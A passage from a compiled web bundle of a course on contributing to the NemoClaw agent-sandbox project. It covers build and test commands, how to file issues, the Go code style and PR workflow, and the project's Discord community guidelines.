└── README.md`}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-100 mt-8",children:"Key Directories in Detail"}),e.jsx(n,{title:"Key Directories and Their Purpose",headers:["Directory","Language","Purpose"],rows:[["cmd/nemoclaw/","Go","CLI entry point. Parses flags, initializes components, dispatches commands."],["internal/agent/","Go","Agent lifecycle: creating sessions, managing tool calls, handling turns."],["internal/sandbox/","Go + C (CGO)","Core sandbox: Landlock, seccomp, network namespaces, cgroups. Most security-critical code lives here."],["internal/policy/","Go","Policy engine: parses YAML policies, resolves rules, generates sandbox configuration."],["internal/tui/","Go","Terminal UI built with Bubble Tea. Views for agent output, network monitor, debug panel."],["internal/llm/","Go","LLM client: handles API calls, streaming, retries, token counting."],["internal/mcp/","Go","MCP integration: manages MCP server lifecycle and tool routing."],["blueprints/","YAML","Built-in blueprints shipped with the binary."],["tests/","Go + Shell","Integration tests that run real sandboxes and verify security properties."]]}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-100 mt-8",children:"Build System"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"NemoClaw is written primarily in Go, with some CGO code for the Landlock and seccomp interfaces that call into the Linux kernel. The build system uses a Makefile that wraps standard Go tooling with additional targets for linting, testing, and cross-compilation."}),e.jsx(t,{language:"bash",title:"Key Makefile targets",children:`# Build the nemoclaw binary
make build
# Output: ./bin/nemoclaw

# Run all tests (unit + integration)
make test

# Run only unit tests (fast, no sandbox required)
make test-unit

# Run integration tests (requires Linux with Landlock support)
make test-integration

# Run the linter (golangci-lint)
make lint

# Format all code
make fmt

# Build for multiple platforms
make build-all
# Output: ./bin/nemoclaw-linux-amd64, ./bin/nemoclaw-linux-arm64

# Generate the seccomp profile schemas
make generate

# Build the Docker image
make docker

# Clean build artifacts
make clean`}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-100 mt-8",children:"Development Prerequisites"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"To build and test NemoClaw from source, you need the following tools and system requirements:"}),e.jsxs("ul",{className:"list-disc list-inside space-y-3 text-gray-700 dark:text-gray-300",children:[e.jsxs("li",{children:[e.jsx("span",{className:"font-semibold",children:"Go 1.22+:"})," NemoClaw uses modern Go features including generics, structured logging (slog), and the new range-over-func syntax. Install from go.dev or use your system package manager."]}),e.jsxs("li",{children:[e.jsx("span",{className:"font-semibold",children:"Linux kernel 5.13+:"})," Required for Landlock support. Kernel 6.7+ is recommended for full feature support including Landlock network control. macOS and Windows are not supported for running sandboxes (the CLI can cross-compile but cannot execute sandboxes)."]}),e.jsxs("li",{children:[e.jsx("span",{className:"font-semibold",children:"GCC or Clang:"})," Required for CGO compilation of the Landlock and seccomp interfaces. Install via build-essential (Debian/Ubuntu) or gcc (RHEL/Fedora)."]}),e.jsxs("li",{children:[e.jsx("span",{className:"font-semibold",children:"libseccomp-dev:"})," Development headers for the seccomp library. Install via apt install libseccomp-dev or equivalent."]}),e.jsxs("li",{children:[e.jsx("span",{className:"font-semibold",children:"golangci-lint:"})," For running the linter. Install from golangci-lint.run or via make install-tools."]}),e.jsxs("li",{children:[e.jsx("span",{className:"font-semibold",children:"Docker (optional):"})," For building container images and running containerized integration tests."]})]}),e.jsx(t,{language:"bash",title:"Setting up the development environment",children:`# Clone the repository
git clone https://github.com/nemoclaw/nemoclaw.git
cd nemoclaw

# Install Go dependencies
go mod download

# Install development tools
make install-tools

# Verify the build works
make build

# Run the unit tests
make test-unit

# Run the full test suite (requires root for namespace operations)
sudo make test-integration`}),e.jsx(a,{type:"info",title:"Running Tests Without Root",children:e.jsx("p",{children:"Many integration tests require root privileges because they create network namespaces and apply Landlock/seccomp rules. However, the unit tests run without root and cover the policy parsing, blueprint validation, LLM client, and TUI logic. If you are working on non-sandbox code, you can iterate quickly with make test-unit. For sandbox changes, you will need to run the integration tests with sudo or in a VM/container where you have root access."})}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"With the repository cloned and the development environment set up, you are ready to explore the codebase, understand the architecture, and start making changes. The next sections cover how to file effective issues and contribute code through pull requests."})]})}const V=Object.freeze(Object.defineProperty({__proto__:null,default:k},Symbol.toStringTag,{value:"Module"}));function j(){return e.jsxs("div",{className:"space-y-6",children:[e.jsx("h1",{className:"text-3xl font-bold text-gray-900 dark:text-white",children:"Filing Effective Issues"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"Filing issues on the NemoClaw GitHub repository is one of the most valuable contributions you can make, even if you never write a line of code. A well-written bug report saves maintainers hours of debugging time. A thoughtful feature request can shape the direction of the project. A clearly documented usability issue can prevent other users from hitting the same problem. This section covers how to file issues that are actionable, complete, and useful to the maintainers and the community."}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-100 mt-8",children:"Bug Reports"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"An effective bug report answers five questions: What did you do? What did you expect to happen? What actually happened? What is your environment? Can you reproduce it? The NemoClaw issue template guides you through these, but understanding why each piece of information matters helps you provide the right level of detail."}),e.jsxs(i,{number:1,title:"Gather environment information",children:[e.jsx("p",{children:"Before filing a bug report, collect the system information that maintainers will need to reproduce the issue. NemoClaw provides a command that captures everything relevant."}),e.jsx(t,{language:"bash",children:`# Generate a complete environment report
nemoclaw system info

# Example output:
# NemoClaw version: 0.8.3
# Go version: go1.22.4
# OS: Ubuntu 24.04.1 LTS
# Kernel: 6.8.0-45-generic
# Architecture: x86_64
# Landlock ABI: 4
# Seccomp: available
# Docker: 27.1.1
# GPU: NVIDIA RTX 4090 (driver 550.120)
# CUDA: 12.4

# Copy this output into your bug report`})]}),e.jsxs(i,{number:2,title:"Write a clear reproduction case",children:[e.jsx("p",{children:"The most important part of a bug report is a reproduction case -- a minimal set of steps that reliably triggers the bug. The best reproduction cases are self-contained: someone should be able to copy-paste your commands and see the same problem."}),e.jsx(t,{language:"markdown",children:`## Steps to reproduce

1. Create a minimal blueprint with the following \`blueprint.yaml\`:
   \`\`\`yaml
   name: "repro-test"
   version: "0.1.0"
   llm:
     provider: "openai-compatible"
     base_url: "http://localhost:11434/v1"
     model: "llama3.1:8b"
     api_key: "test"
   policies:
     network:
       default: deny
       allow:
         - host: "localhost"
           port: 11434
   \`\`\`

2. Start Ollama serving llama3.1:8b

3. Run: \`nemoclaw run --blueprint ./repro-test/ --prompt "Hello"\`

4. Observe the error output

## Expected behavior
The agent should connect to Ollama and respond.

## Actual behavior
Connection is refused with error:
\`\`\`
ERROR: dial tcp 127.0.0.1:11434: connect: connection refused
\`\`\`

The network policy allows localhost:11434, but the connection is
still blocked. This appears to be because "localhost" resolves to
127.0.0.1 but the sandbox's /etc/hosts does not contain this mapping.`})]}),e.jsx(i,{number:3,title:"Include relevant logs",children:e.jsx(t,{language:"bash",children:`# Run with verbose logging to capture detailed output
nemoclaw run --blueprint my-agent --log-level debug --prompt "trigger the bug" 2>&1 | tee /tmp/debug-output.txt

# Include the relevant portion of the log in your bug report
# Trim to the relevant section -- do not paste thousands of lines

# For sandbox-specific issues, also include:
dmesg | tail -50       # Kernel messages (Landlock/seccomp denials)
journalctl --since "10 minutes ago" | grep nemoclaw  # System journal`})}),e.jsx(a,{type:"info",title:"Redact Sensitive Information",children:e.jsx("p",{children:"Before posting logs or configuration in a bug report, check for sensitive information that should not be shared publicly. Remove or redact: API keys, authentication tokens, internal hostnames and IP addresses, file paths that reveal organizational structure, and any data from your agent's inputs or outputs that may be confidential. Replace them with placeholder values like [REDACTED] or example.com."})}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-100 mt-8",children:"Feature Requests"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"Feature requests are most effective when they describe the problem you are trying to solve, not just the solution you envision. Maintainers have broad context about the project's architecture and roadmap -- they may know a better way to achieve your goal, or they may recognize that your use case aligns with existing plans."}),e.jsx(t,{language:"markdown",title:"Feature request template",children:`## Problem statement
Describe the problem or limitation you are facing. What are you
trying to accomplish that NemoClaw does not currently support?

Example: "When running multiple agents that share a workspace
directory, there is no way to enforce per-agent write isolation
within the shared directory. Agent A can overwrite files created
by Agent B."

## Proposed solution
Describe your ideal solution. Be specific about behavior, not
implementation details.

Example: "Each agent should be able to write to a dedicated
subdirectory (e.g., /workspace/.agent-<id>/) while having
read-only access to the shared parent. The sandbox should
automatically create the agent-specific directory on startup."

## Alternatives considered
What workarounds have you tried? Why are they insufficient?

Example: "I tried creating separate workspace mounts for each
agent, but this prevents them from reading each other's output,
which is required for the coordinator agent pattern."

## Use case
Describe the real-world scenario that motivates this request.

Example: "Multi-agent code review pipeline where a coordinator
agent delegates to specialist agents (security reviewer, style
reviewer, test coverage reviewer) that all need to read the
same codebase but write their findings independently."`}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-100 mt-8",children:"Labels and Triage Process"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"The NemoClaw project uses GitHub labels to categorize and prioritize issues. Understanding the label system helps you set appropriate expectations for response time and helps maintainers route your issue to the right reviewer."}),e.jsx(n,{title:"Issue Labels",headers:["Label","Meaning","Response Time"],rows:[["bug","Confirmed or suspected bug","1-3 days for triage"],["security","Security-related issue (may be handled privately)","Within 24 hours"],["feature-request","Request for new functionality","1-2 weeks for initial response"],["enhancement","Improvement to existing functionality","1-2 weeks for initial response"],["documentation","Documentation issue or improvement","3-7 days"],["good-first-issue","Suitable for new contributors","Usually well-documented with hints"],["help-wanted","Maintainers welcome community contributions","Guidance provided in comments"],["sandbox","Related to Landlock/seccomp/namespace sandbox","Requires Linux-specific expertise"],["policy","Related to the policy engine","May need design discussion"],["tui","Related to the terminal UI","Bubble Tea framework knowledge helpful"],["wontfix","Decided not to address (with explanation)","Closed with rationale"],["duplicate","Duplicate of an existing issue","Linked to original issue"]]}),e.jsx(s,{title:"Security Vulnerabilities",children:e.jsx("p",{children:"If you discover a security vulnerability in NemoClaw -- particularly one that could allow sandbox escape, policy bypass, or unauthorized access -- do not file a public GitHub issue. Instead, use GitHub's private security advisory feature or email security@nemoclaw.dev directly. The NemoClaw team follows responsible disclosure practices and will work with you to understand the vulnerability, develop a fix, and coordinate a public disclosure timeline. Security reports are acknowledged within 24 hours."})}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-100 mt-8",children:"After Filing"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"After you file an issue, maintainers will triage it -- confirming the bug, asking clarifying questions, or adding labels. Be responsive to follow-up questions, especially for bug reports where additional information may be needed to reproduce the issue. If you are able to investigate further (using the debugging techniques from the previous chapter), updates that narrow down the cause are extremely valuable."}),e.jsxs("ul",{className:"list-disc list-inside space-y-3 text-gray-700 dark:text-gray-300",children:[e.jsxs("li",{children:[e.jsx("span",{className:"font-semibold",children:"Respond to questions promptly:"})," Maintainer attention is a limited resource. When they ask a question, a quick response keeps the issue from going stale."]}),e.jsxs("li",{children:[e.jsx("span",{className:"font-semibold",children:"Test proposed fixes:"})," If a maintainer posts a potential fix or asks you to test a branch, doing so accelerates the resolution."]}),e.jsxs("li",{children:[e.jsx("span",{className:"font-semibold",children:"Close resolved issues:"})," If your issue is resolved (by a fix, a workaround, or realizing it was user error), close it with a comment explaining the resolution. This helps others who encounter the same issue."]}),e.jsxs("li",{children:[e.jsx("span",{className:"font-semibold",children:"Consider contributing the fix:"})," If you identify the cause of a bug and know how to fix it, a pull request is even more valuable than an issue. The next section covers the contribution workflow."]})]}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"Well-filed issues are the backbone of open-source project quality. Every issue represents someone caring enough about the project to document a problem or suggest an improvement. The NemoClaw maintainers treat every issue with respect, and the community benefits from the knowledge captured in the issue tracker's history."})]})}const z=Object.freeze(Object.defineProperty({__proto__:null,default:j},Symbol.toStringTag,{value:"Module"}));function N(){return e.jsxs("div",{className:"space-y-6",children:[e.jsx("h1",{className:"text-3xl font-bold text-gray-900 dark:text-white",children:"Contributing Code to NemoClaw"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"Contributing code to NemoClaw follows the standard open-source fork-and-pull-request workflow, with some project-specific conventions around code style, testing requirements, and review criteria. This section walks through the complete contribution lifecycle: from forking the repository to getting your pull request merged."}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-100 mt-8",children:"Fork, Clone, and Branch"}),e.jsx(i,{number:1,title:"Fork and clone the repository",children:e.jsx(t,{language:"bash",children:`# Fork on GitHub (click the "Fork" button), then clone your fork
git clone https://github.com/YOUR-USERNAME/nemoclaw.git
cd nemoclaw

# Add the upstream remote for syncing
git remote add upstream https://github.com/nemoclaw/nemoclaw.git

# Verify remotes
git remote -v
# origin    https://github.com/YOUR-USERNAME/nemoclaw.git (fetch)
# origin    https://github.com/YOUR-USERNAME/nemoclaw.git (push)
# upstream  https://github.com/nemoclaw/nemoclaw.git (fetch)
# upstream  https://github.com/nemoclaw/nemoclaw.git (push)`})}),e.jsxs(i,{number:2,title:"Create a feature branch",children:[e.jsx("p",{children:"Always create a branch from the latest main. Branch names should be descriptive and follow the convention: type/short-description."}),e.jsx(t,{language:"bash",children:`# Sync with upstream
git fetch upstream
git checkout main
git merge upstream/main

# Create a feature branch
git checkout -b fix/landlock-symlink-resolution

# Branch naming conventions:
# fix/description     - Bug fixes
# feat/description    - New features
# docs/description    - Documentation changes
# refactor/description - Code refactoring
# test/description    - Test additions or fixes`})]}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-100 mt-8",children:"Code Style and Conventions"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"NemoClaw follows standard Go conventions with some project-specific additions. Adhering to these conventions makes your PR easier to review and more likely to be accepted without extensive revision requests."}),e.jsxs("ul",{className:"list-disc list-inside space-y-3 text-gray-700 dark:text-gray-300",children:[e.jsxs("li",{children:[e.jsx("span",{className:"font-semibold",children:"Formatting:"})," All Go code must pass gofmt and goimports. Run make fmt before committing. The CI pipeline will reject PRs with formatting issues."]}),e.jsxs("li",{children:[e.jsx("span",{className:"font-semibold",children:"Linting:"})," NemoClaw uses golangci-lint with a project-specific configuration (.golangci.yml). Run make lint locally before pushing to catch issues early."]}),e.jsxs("li",{children:[e.jsx("span",{className:"font-semibold",children:"Error handling:"}),` Use Go's standard error wrapping with fmt.Errorf("context: %w", err). Do not discard errors silently. Every error path should either be handled or propagated with context.`]}),e.jsxs("li",{children:[e.jsx("span",{className:"font-semibold",children:"Logging:"})," Use the project's structured logger (based on slog). Do not use fmt.Println for logging. Log levels should match their content: Debug for verbose diagnostic info, Info for normal operational events, Warn for recoverable issues, Error for failures."]}),e.jsxs("li",{children:[e.jsx("span",{className:"font-semibold",children:"Comments:"}),' All exported functions, types, and constants must have Go doc comments. Complex internal logic should have comments explaining the "why", not the "what".']}),e.jsxs("li",{children:[e.jsx("span",{className:"font-semibold",children:"Security-critical code:"})," Code in the sandbox package (Landlock, seccomp, namespace setup) requires extra scrutiny. Changes here must include a security rationale in the PR description and will require review from a security-focused maintainer."]})]}),e.jsx(t,{language:"go",title:"Code style example",children:`// ResolveBlueprint finds and loads a blueprint by name or path.
// It searches the resolution chain: explicit path, local directory,
// project directory, then built-in blueprints.
func ResolveBlueprint(nameOrPath string) (*Blueprint, error) {
	// Try explicit path first -- if it looks like a filesystem path,
	// load it directly without searching the resolution chain.
	if isFilesystemPath(nameOrPath) {
		bp, err := loadFromPath(nameOrPath)
		if err != nil {
			return nil, fmt.Errorf("loading blueprint from path %q: %w", nameOrPath, err)
		}
		return bp, nil
	}

	// Search the resolution chain for a matching blueprint name.
	for _, dir := range resolutionDirs() {
		candidate := filepath.Join(dir, nameOrPath, "blueprint.yaml")
		if _, err := os.Stat(candidate); err == nil {
			slog.Debug("found blueprint", "name", nameOrPath, "path", candidate)
			return loadFromPath(filepath.Dir(candidate))
		}
	}

	return nil, fmt.Errorf("blueprint %q not found in resolution chain", nameOrPath)
}`}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-100 mt-8",children:"Writing Tests"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"All code changes must include tests. The type of test depends on what you are changing:"}),e.jsxs("ul",{className:"list-disc list-inside space-y-3 text-gray-700 dark:text-gray-300",children:[e.jsxs("li",{children:[e.jsx("span",{className:"font-semibold",children:"Unit tests:"})," For pure logic (policy parsing, configuration validation, type conversions). These run without root privileges and without network access. Place them next to the code: foo_test.go alongside foo.go."]}),e.jsxs("li",{children:[e.jsx("span",{className:"font-semibold",children:"Integration tests:"})," For code that interacts with the kernel (Landlock, seccomp, namespaces). These require root and a Linux kernel with appropriate features. Place them in tests/integration/."]}),e.jsxs("li",{children:[e.jsx("span",{className:"font-semibold",children:"End-to-end tests:"})," For testing the full NemoClaw workflow (start sandbox, run agent, verify behavior). These are slower and require a running LLM endpoint. Place them in tests/e2e/."]})]}),e.jsx(t,{language:"go",title:"Example test",children:`func TestResolveBlueprintByName(t *testing.T) {
	// Set up a temporary blueprints directory
	tmpDir := t.TempDir()
	bpDir := filepath.Join(tmpDir, "test-bp")
	os.MkdirAll(bpDir, 0755)
	os.WriteFile(
		filepath.Join(bpDir, "blueprint.yaml"),
		[]byte("name: test-bp
version: 1.0.0
"),
		0644,
	)

	// Override the resolution chain to use our temp directory
	t.Setenv("NEMOCLAW_BLUEPRINTS_DIR", tmpDir)

	// Test resolution by name
	bp, err := ResolveBlueprint("test-bp")
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if bp.Name != "test-bp" {
		t.Errorf("expected name 'test-bp', got %q", bp.Name)
	}
}

func TestResolveBlueprintNotFound(t *testing.T) {
	t.Setenv("NEMOCLAW_BLUEPRINTS_DIR", t.TempDir())

	_, err := ResolveBlueprint("nonexistent")
	if err == nil {
		t.Fatal("expected error for nonexistent blueprint")
	}
	if !strings.Contains(err.Error(), "not found") {
		t.Errorf("expected 'not found' error, got: %v", err)
	}
}`}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-100 mt-8",children:"Submitting a Pull Request"}),e.jsx(i,{number:3,title:"Commit, push, and open a PR",children:e.jsx(t,{language:"bash",children:`# Stage your changes
git add internal/blueprint/resolver.go internal/blueprint/resolver_test.go

# Commit with a descriptive message
git commit -m "fix: resolve symlinks in blueprint path lookup

When a blueprint path contains symlinks, the resolver now follows
them to the real path before checking for blueprint.yaml. This
fixes #1234 where blueprints in symlinked directories were not
found.

Also adds test cases for symlink resolution."

# Push to your fork
git push origin fix/landlock-symlink-resolution

# Open a pull request on GitHub
# The PR description should include:
# - What the change does
# - Why it is needed (link to issue)
# - How it was tested
# - Any security implications`})}),e.jsx(t,{language:"markdown",title:"Pull request description template",children:`## What

Fix symlink resolution in blueprint path lookup.

## Why

Resolves #1234. When blueprints are stored in directories accessed
via symlinks (common in NixOS and some container setups), the
resolver failed to find them because it checked the symlink path
rather than the resolved real path.

## How

Changed \`ResolveBlueprint\` to call \`filepath.EvalSymlinks\` on
the candidate path before checking for \`blueprint.yaml\`.

## Testing

- Added unit tests for symlink resolution (both single and chained symlinks)
- Tested manually on NixOS with a symlinked blueprints directory
- All existing tests pass

## Security implications

None. This change affects blueprint resolution only, not sandbox
security boundaries. The resolved path is still validated against
the same directory constraints.`}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-100 mt-8",children:"CI Requirements and Review Process"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"When you open a PR, the CI pipeline runs automatically. All checks must pass before the PR can be merged. The pipeline includes:"}),e.jsxs("ul",{className:"list-disc list-inside space-y-3 text-gray-700 dark:text-gray-300",children:[e.jsxs("li",{children:[e.jsx("span",{className:"font-semibold",children:"Build:"})," Compiles the binary for Linux amd64 and arm64."]}),e.jsxs("li",{children:[e.jsx("span",{className:"font-semibold",children:"Lint:"})," Runs golangci-lint with the project configuration."]}),e.jsxs("li",{children:[e.jsx("span",{className:"font-semibold",children:"Unit tests:"})," Runs all unit tests with race detector enabled."]}),e.jsxs("li",{children:[e.jsx("span",{className:"font-semibold",children:"Integration tests:"})," Runs sandbox integration tests in a privileged CI environment."]}),e.jsxs("li",{children:[e.jsx("span",{className:"font-semibold",children:"Security scan:"})," Runs gosec and checks for known vulnerabilities in dependencies."]}),e.jsxs("li",{children:[e.jsx("span",{className:"font-semibold",children:"Coverage:"})," Reports test coverage. Coverage must not decrease from the base branch."]})]}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"After CI passes, one or two maintainers will review your code. They may request changes, ask questions, or suggest improvements. The review process is collaborative, not adversarial -- reviewers want your contribution to succeed. Address review comments by pushing additional commits to your branch (do not force-push or squash during review, as it makes it harder for reviewers to see what changed). The maintainers will squash the commits when merging."}),e.jsx(s,{title:"DCO Sign-Off Required",children:e.jsx("p",{children:`NemoClaw requires a Developer Certificate of Origin (DCO) sign-off on all commits. This certifies that you have the right to submit the code under the project's license. Add -s to your git commit command to include the sign-off line automatically: git commit -s -m "your message". The CI pipeline checks for the sign-off and will fail if it is missing.`})}),e.jsx(o,{title:"Make Your First Contribution",difficulty:"intermediate",children:e.jsxs("ol",{className:"list-decimal list-inside space-y-2 mt-2",children:[e.jsx("li",{children:"Fork and clone the NemoClaw repository."}),e.jsx("li",{children:"Set up the development environment and verify make build succeeds."}),e.jsx("li",{children:'Find an issue labeled "good-first-issue" on the GitHub issue tracker.'}),e.jsx("li",{children:"Create a feature branch, implement the fix, and write tests."}),e.jsx("li",{children:"Run make lint and make test-unit to verify your changes pass."}),e.jsx("li",{children:"Open a pull request with a clear description following the template above."})]})}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"Contributing code is the most direct way to shape the future of NemoClaw. Every merged pull request -- whether it fixes a typo in a comment or redesigns a core subsystem -- makes the project better for everyone who uses it. The final section covers the NemoClaw community beyond code: the Discord server where contributors and users connect, discuss, and collaborate."})]})}const W=Object.freeze(Object.defineProperty({__proto__:null,default:N},Symbol.toStringTag,{value:"Module"}));function C(){return e.jsxs("div",{className:"space-y-6",children:[e.jsx("h1",{className:"text-3xl font-bold text-gray-900 dark:text-white",children:"The NemoClaw Community and Discord"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"Open-source projects thrive on their communities, and NemoClaw is no exception. While GitHub is the home for code, issues, and pull requests, the NemoClaw Discord server is where the community gathers for real-time discussion, mutual help, design conversations, and the kind of informal knowledge sharing that does not fit neatly into a GitHub issue. Whether you are just getting started with NemoClaw, building a complex multi-agent deployment, or contributing to the codebase, the Discord community is a valuable resource."}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-100 mt-8",children:"Discord Server Structure"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"The NemoClaw Discord server is organized into channels that cover different aspects of the project. Understanding the channel structure helps you find the right place for your questions and conversations."}),e.jsx(n,{title:"Discord Channel Guide",headers:["Channel","Purpose","Who Should Use It"],rows:[["#general","General discussion about NemoClaw, AI agents, and sandbox security","Everyone"],["#help","Ask questions about using NemoClaw. Installation issues, configuration help, debugging","Users seeking help; experienced users who want to help others"],["#blueprints","Share, discuss, and get feedback on custom blueprints","Blueprint creators and users"],["#local-inference","NIM, vLLM, Ollama setup and optimization discussion","Users running local models"],["#sandbox-internals","Deep technical discussion about Landlock, seccomp, namespaces","Contributors and advanced users"],["#showcase","Show off what you have built with NemoClaw","Anyone with a cool project to share"],["#dev","Contributor coordination, design discussions, PR reviews","Active contributors"],["#announcements","Official announcements: releases, security advisories, events","Read-only for most; maintainers post"],["#off-topic","Non-NemoClaw conversation","Everyone (keep it friendly)"]]}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-100 mt-8",children:"Getting Help Effectively"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"The #help channel is the most active channel on the server. To get the fastest and most useful responses, follow these guidelines when asking for help:"}),e.jsxs("ul",{className:"list-disc list-inside space-y-3 text-gray-700 dark:text-gray-300",children:[e.jsxs("li",{children:[e.jsx("span",{className:"font-semibold",children:"Ask in the channel, not in DMs:"})," Public questions benefit everyone. Someone else likely has the same problem, and the answer becomes searchable for future visitors. Do not DM maintainers directly unless they invite you to."]}),e.jsxs("li",{children:[e.jsx("span",{className:"font-semibold",children:"Include context upfront:"}),' State your NemoClaw version, what you are trying to do, what you have tried, and what the error is. Do not start with "Is anyone here?" or "Can someone help?" -- just post your question with full context.']}),e.jsxs("li",{children:[e.jsx("span",{className:"font-semibold",children:"Use code blocks:"})," Discord supports Markdown code blocks. Wrap configuration, logs, and commands in triple backticks with a language identifier for readability."]}),e.jsxs("li",{children:[e.jsx("span",{className:"font-semibold",children:"Include nemoclaw system info output:"})," This single command provides all the environment context that helpers need."]}),e.jsxs("li",{children:[e.jsx("span",{className:"font-semibold",children:"Follow up with the solution:"})," If you figure out the answer to your own question, post it. This helps others and shows respect for people who spent time thinking about your problem."]})]}),e.jsx(a,{type:"info",title:"Response Expectations",children:e.jsx("p",{children:"NemoClaw is an open-source project maintained by volunteers and a small core team. Response times in Discord vary -- during active hours (US and European business hours), you might get a response within minutes. During off hours, it might take several hours. Complex questions that require investigation may take longer. If your question goes unanswered for more than 24 hours, it is fine to bump it once with additional context or a rephrased question. Persistent questions without new information come across as demanding and are less likely to get help."})}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-100 mt-8",children:"Contributing to Discussions"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"Beyond asking for help, there are many ways to participate in the community that make NemoClaw better for everyone:"}),e.jsxs("ul",{className:"list-disc list-inside space-y-3 text-gray-700 dark:text-gray-300",children:[e.jsxs("li",{children:[e.jsx("span",{className:"font-semibold",children:"Answer questions in #help:"})," If you have figured something out that others are struggling with, share your knowledge. You do not need to be an expert to help -- even pointing someone to the right documentation section is valuable."]}),e.jsxs("li",{children:[e.jsx("span",{className:"font-semibold",children:"Share your experience in #showcase:"})," Deployment stories, benchmark results, interesting agent configurations, and lessons learned are all welcome. These real-world experiences help others understand what is possible and what pitfalls to avoid."]}),e.jsxs("li",{children:[e.jsx("span",{className:"font-semibold",children:"Participate in design discussions in #dev:"})," When maintainers propose new features or architectural changes, community input is important. Even if you are not writing the code, your perspective as a user helps shape decisions."]}),e.jsxs("li",{children:[e.jsx("span",{className:"font-semibold",children:"Review blueprints in #blueprints:"})," When someone shares a blueprint for feedback, review it using the security evaluation techniques from this course. Constructive feedback on policy configurations improves the quality of shared blueprints."]}),e.jsxs("li",{children:[e.jsx("span",{className:"font-semibold",children:"Report issues you discover:"})," If you find a bug during a Discord conversation, encourage the reporter (or do it yourself) to file a proper GitHub issue so it gets tracked."]})]}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-100 mt-8",children:"Community Events"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"The NemoClaw community hosts regular events that provide opportunities for deeper engagement:"}),e.jsxs("ul",{className:"list-disc list-inside space-y-3 text-gray-700 dark:text-gray-300",children:[e.jsxs("li",{children:[e.jsx("span",{className:"font-semibold",children:"Monthly Community Calls:"})," A video call (usually on the last Thursday of each month) where maintainers share project updates, demo new features, and answer questions from the community. The call is recorded and posted in #announcements for those who cannot attend live."]}),e.jsxs("li",{children:[e.jsx("span",{className:"font-semibold",children:"Contributor Sprints:"})," Periodic coordinated efforts where community members tackle a batch of issues together. Sprint events are announced in #dev with a curated list of issues appropriate for different skill levels. These are excellent opportunities for first-time contributors."]}),e.jsxs("li",{children:[e.jsx("span",{className:"font-semibold",children:"Security Review Days:"})," Focused sessions where the community collectively reviews security-sensitive code or blueprints. These events help train new security reviewers and improve the project's security posture."]}),e.jsxs("li",{children:[e.jsx("span",{className:"font-semibold",children:"Blueprint Showcases:"})," Events where community members present their custom blueprints, explaining the use case, design decisions, and security considerations. A great way to learn from others' approaches."]})]}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-100 mt-8",children:"Community Guidelines and Code of Conduct"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"The NemoClaw community operates under a code of conduct that prioritizes respectful, inclusive, and constructive interaction. The key principles are:"}),e.jsxs("ul",{className:"list-disc list-inside space-y-3 text-gray-700 dark:text-gray-300",children:[e.jsxs("li",{children:[e.jsx("span",{className:"font-semibold",children:"Be respectful:"})," Disagree with ideas, not people. Technical discussions can be passionate, but personal attacks, dismissiveness, and condescension are not tolerated."]}),e.jsxs("li",{children:[e.jsx("span",{className:"font-semibold",children:"Be inclusive:"})," NemoClaw users and contributors come from diverse backgrounds and experience levels. A question that seems basic to you was once a challenge for everyone. Welcome newcomers."]}),e.jsxs("li",{children:[e.jsx("span",{className:"font-semibold",children:"Be constructive:"}),' When providing feedback -- on code, blueprints, or ideas -- focus on specific, actionable suggestions. "This policy is too permissive because X, consider restricting Y" is more useful than "This is insecure."']}),e.jsxs("li",{children:[e.jsx("span",{className:"font-semibold",children:"Respect maintainer decisions:"})," Maintainers make judgment calls about project direction, feature priorities, and code quality standards. You can disagree respectfully and make your case, but ultimately the maintainers have final say."]})]}),e.jsx(s,{title:"Reporting Code of Conduct Violations",children:e.jsx("p",{children:"If you experience or witness behavior that violates the code of conduct, report it to the moderation team via the Discord reporting mechanism or by emailing conduct@nemoclaw.dev. Reports are handled confidentially. The moderation team will investigate and take appropriate action, which may range from 